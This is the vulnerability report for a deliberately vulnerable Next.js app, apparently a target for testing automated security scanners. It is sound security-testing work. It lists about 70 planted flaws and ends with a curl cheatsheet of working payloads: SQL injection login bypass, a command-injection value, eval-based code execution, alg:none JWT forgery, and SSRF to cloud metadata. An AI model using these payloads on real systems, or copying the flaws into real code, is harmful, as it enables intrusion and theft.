# VulnApp — Vulnerability Report
> Deliberately Vulnerable Next.js Application · For Security Testing Only

## Overview
This Next.js app contains **107+ intentional vulnerabilities** across OWASP Top 10 categories,
designed for testing autonomous multi-agent security scanning systems.

---

## Vulnerability Index

| ID | Category | File | Description | Severity |
|----|----------|------|-------------|----------|
| VULN-001 | Hardcoded Secrets | `lib/db.ts` | Hardcoded DB password `Admin@123` | CRITICAL |
| VULN-002 | Hardcoded Secrets | `lib/db.ts` | Hardcoded admin credentials | CRITICAL |
| VULN-003 | Hardcoded Secrets | `lib/db.ts` | Weak JWT secret `"secret"` | HIGH |
| VULN-004 | Hardcoded Secrets | `lib/db.ts`, `.env` | AWS keys, Stripe key in source | CRITICAL |
| VULN-005 | Broken Crypto | `lib/auth.ts`, `lib/crypto.ts` | MD5 password hashing | HIGH |
| VULN-006 | SQL Injection | `app/api/auth/login/route.ts`, `app/api/search/route.ts` | String-concatenated queries | CRITICAL |
| VULN-007 | Info Disclosure | `lib/db.ts`, `lib/logger.ts` | Credentials logged in plaintext | HIGH |
| VULN-008 | Broken Auth | `lib/auth.ts`, `app/admin/page.tsx` | JWT `alg:none` accepted → token forgery | CRITICAL |
| VULN-009 | Broken Auth | `lib/auth.ts` | No JWT expiry (`exp` claim missing) | HIGH |
| VULN-010 | Session Management | `app/login/page.tsx` | JWT stored in localStorage (XSS-accessible) | MEDIUM |
| VULN-011 | Broken Auth | `app/api/auth/reset/route.ts` | Predictable sequential reset tokens | HIGH |
| VULN-013 | Broken Crypto | `lib/auth.ts` | Timing-unsafe string comparison | MEDIUM |
| VULN-014 | Info Disclosure | Multiple API routes | PII (SSN, CC, password hash) in API responses | HIGH |
| VULN-015 | Broken Auth | `lib/auth.ts` | Admin check trusts forgeable JWT claim | CRITICAL |
| VULN-016 | Info Disclosure | `app/api/auth/login/route.ts` | Plaintext password logged | CRITICAL |
| VULN-017 | Enumeration | `app/api/auth/login/route.ts` | Distinct error messages leak username validity | LOW |
| VULN-018 | Info Disclosure | Multiple API routes | Stack traces returned in HTTP responses | MEDIUM |
| VULN-019 | Mass Assignment | `app/api/auth/register/route.ts`, `app/api/users/[id]/route.ts` | `...body` spread on DB object | HIGH |
| VULN-020 | Weak Auth | `app/api/auth/register/route.ts` | No password strength requirements | MEDIUM |
| VULN-022 | Privilege Escalation | `app/api/auth/register/route.ts` | `role:"admin"` accepted from user input | CRITICAL |
| VULN-023 | Command Injection | `app/api/exec/route.ts` | `host` param passed to `exec()` | CRITICAL |
| VULN-026 | Path Traversal | `app/api/files/route.ts` | `../` sequences in filename not blocked | CRITICAL |
| VULN-030 | Arbitrary Write | `app/api/files/route.ts` | Unauthenticated arbitrary file write | CRITICAL |
| VULN-031 | SSRF | `app/api/fetch/route.ts` | Any URL fetched — internal metadata accessible | CRITICAL |
| VULN-034 | IDOR | `app/api/users/[id]/route.ts`, `app/dashboard/page.tsx` | No ownership check on user resources | HIGH |
| VULN-036 | Broken AC | `app/api/users/route.ts` | `/api/users` returns all users w/o auth | HIGH |
| VULN-040 | CSRF | `app/api/users/[id]/route.ts` | DELETE with no CSRF protection | MEDIUM |
| VULN-043 | Info Disclosure | `app/api/search/route.ts` | SSN field searchable and returned | HIGH |
| VULN-044 | Broken AC | `app/api/posts/route.ts` | Private posts returned without auth | HIGH |
| VULN-046 | Stored XSS | `app/api/comments/route.ts` | Raw HTML stored without sanitisation | CRITICAL |
| VULN-047 | Broken Auth | `app/api/comments/route.ts` | Comment POST requires no authentication | MEDIUM |
| VULN-048 | Stored XSS | `app/comments/page.tsx` | Stored comment rendered via `dangerouslySetInnerHTML` | CRITICAL |
| VULN-050 | Broken AC | `app/api/admin/route.ts` | Admin gate relies only on forgeable JWT claim | CRITICAL |
| VULN-052 | Info Disclosure | `app/api/admin/route.ts` | `process.env` + `os.*` dumped to response | CRITICAL |
| VULN-054 | Backdoor | `app/api/admin/route.ts`, `app/page.tsx` | Intentional backdoor endpoint | CRITICAL |
| VULN-055 | Broken Auth | `app/api/auth/reset/route.ts` | Reset tokens never expire | HIGH |
| VULN-057 | Enumeration | `app/api/auth/reset/route.ts` | Username enumeration via error messages | LOW |
| VULN-058 | Info Disclosure | `app/api/auth/reset/route.ts` | Reset token returned in response body | HIGH |
| VULN-059 | RCE | `app/api/eval/route.ts` | `eval()` executes user-supplied expression | CRITICAL |
| VULN-060 | Prototype Pollution | `app/api/eval/route.ts` | `deepMerge` accepts `__proto__` keys | HIGH |
| VULN-061 | DoS (ReDoS) | `app/api/eval/route.ts` | Catastrophic regex backtracking | MEDIUM |
| VULN-062 | Insecure Deser. | `app/api/eval/route.ts` | `eval()` on "serialized" user input | CRITICAL |
| VULN-063 | Open Redirect | `app/api/redirect/route.ts` | Any URL accepted as `returnUrl` | MEDIUM |
| VULN-066 | File Upload | `app/api/upload/route.ts` | No file type validation | HIGH |
| VULN-067 | File Upload | `app/api/upload/route.ts` | Files stored in public directory | HIGH |
| VULN-068 | Path Traversal | `app/api/upload/route.ts` | Original filename used without sanitisation | HIGH |
| VULN-070 | Business Logic | `app/api/transfer/route.ts` | No balance check before deducting | HIGH |
| VULN-071 | Business Logic | `app/api/transfer/route.ts` | Negative amount reverses transfer direction | CRITICAL |
| VULN-073 | Race Condition | `app/api/transfer/route.ts` | Non-atomic balance update | HIGH |
| VULN-074 | DOM XSS | `app/page.tsx`, `app/dashboard/page.tsx`, `app/search/page.tsx` | URL params → `dangerouslySetInnerHTML` | CRITICAL |
| VULN-075 | Session Mgmt | `app/login/page.tsx` | JWT stored in localStorage | MEDIUM |
| VULN-077 | Config | `next.config.ts` | `dangerouslyAllowSVG` without safe content disposition | MEDIUM |
| VULN-078 | Info Disclosure | `next.config.ts`, `app/layout.tsx` | Tech stack version leaked in headers/meta | LOW |
| VULN-079 | Missing CSP | `next.config.ts`, `app/layout.tsx` | No Content-Security-Policy | HIGH |
| VULN-080 | SSRF | `next.config.ts` | Wildcard remote image hostname | MEDIUM |
| VULN-081 | CORS | `next.config.ts` | Wildcard `Access-Control-Allow-Origin: *` | MEDIUM |
| VULN-082 | Info Disclosure | `next.config.ts` | Source maps in production | MEDIUM |
| VULN-086 | Broken Auth | `middleware.ts` | Middleware only checks token presence, not validity | HIGH |
| VULN-087 | Auth Bypass | `middleware.ts` | `?bypass=true` skips all auth | CRITICAL |
| VULN-088 | Missing Auth | `middleware.ts` | `/admin` not in protected routes list | CRITICAL |
| VULN-089 | Cookie | `middleware.ts` | Cookie set without `Secure`/`HttpOnly` | HIGH |
| VULN-092 | Log Injection | `lib/logger.ts` | User input injected into log lines | MEDIUM |
| VULN-093 | Info Disclosure | `lib/logger.ts` | Log file in `public/` directory | HIGH |
| VULN-095 | Broken Crypto | `lib/crypto.ts` | AES-CBC with static IV | HIGH |
| VULN-096 | Broken Crypto | `lib/crypto.ts` | Deterministic ciphertext for same plaintext | HIGH |
| VULN-097 | Hardcoded Key | `lib/crypto.ts` | AES key hardcoded in source | CRITICAL |
| VULN-100 | Broken Crypto | `lib/crypto.ts` | XOR with single-char key | HIGH |
| VULN-101 | Weak Randomness | `lib/crypto.ts` | `Math.random()` for security tokens | HIGH |
| VULN-103 | SRI Missing | `app/layout.tsx` | Third-party `<script>` without integrity check | MEDIUM |
| VULN-104 | Info Disclosure | `app/layout.tsx` | `referrer: unsafe-url` leaks full URLs | LOW |
| VULN-106 | Clickjacking | `app/layout.tsx` | Missing `X-Frame-Options` header | MEDIUM |
| VULN-107 | CSRF | `app/layout.tsx` | No CSRF token in global state | MEDIUM |

---

## Quick Exploit Cheatsheet

```bash
# SQL Injection — bypass login
curl -X POST http://localhost:3000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username": "'\'' OR '\''1'\''='\''1", "password": "x"}'

# IDOR — read admin PII without auth
curl http://localhost:3000/api/users/1

# All users with SSN/CC — no auth
curl http://localhost:3000/api/users

# JWT alg:none — forge admin token
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"id":1,"username":"admin","role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_')
TOKEN="${HEADER}.${PAYLOAD}."
curl "http://localhost:3000/api/admin?action=debug" -H "Authorization: Bearer $TOKEN"

# Command Injection
curl "http://localhost:3000/api/exec?host=localhost;id"

# Path Traversal — read secrets
curl "http://localhost:3000/api/files?file=../../lib/db.ts"

# SSRF — AWS metadata
curl "http://localhost:3000/api/fetch?url=http://169.254.169.254/latest/meta-data/"

# Mass Assignment — register as admin
curl -X POST http://localhost:3000/api/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"evil","password":"x","role":"admin","isAdmin":true,"balance":999999}'

# RCE via eval
curl -X POST http://localhost:3000/api/eval \
  -H 'Content-Type: application/json' \
  -d '{"action":"calculate","expression":"require(\"child_process\").execSync(\"id\").toString()"}'

# Auth bypass via middleware
curl http://localhost:3000/dashboard?bypass=true

# Stored XSS
curl -X POST http://localhost:3000/api/comments \
  -H 'Content-Type: application/json' \
  -d '{"postId":1,"author":"x","content":"<script>alert(document.cookie)</script>"}'

# Negative transfer — steal balance
curl -X POST http://localhost:3000/api/transfer \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"toUserId":1,"amount":-99999}'

# Env dump (with forged token)
curl "http://localhost:3000/api/admin?action=debug" -H "Authorization: Bearer $TOKEN"
```

---

## Running the PoE Script

```bash
cd test
npm run dev         # start the app
node poe.mjs        # in another terminal — runs all exploits
```
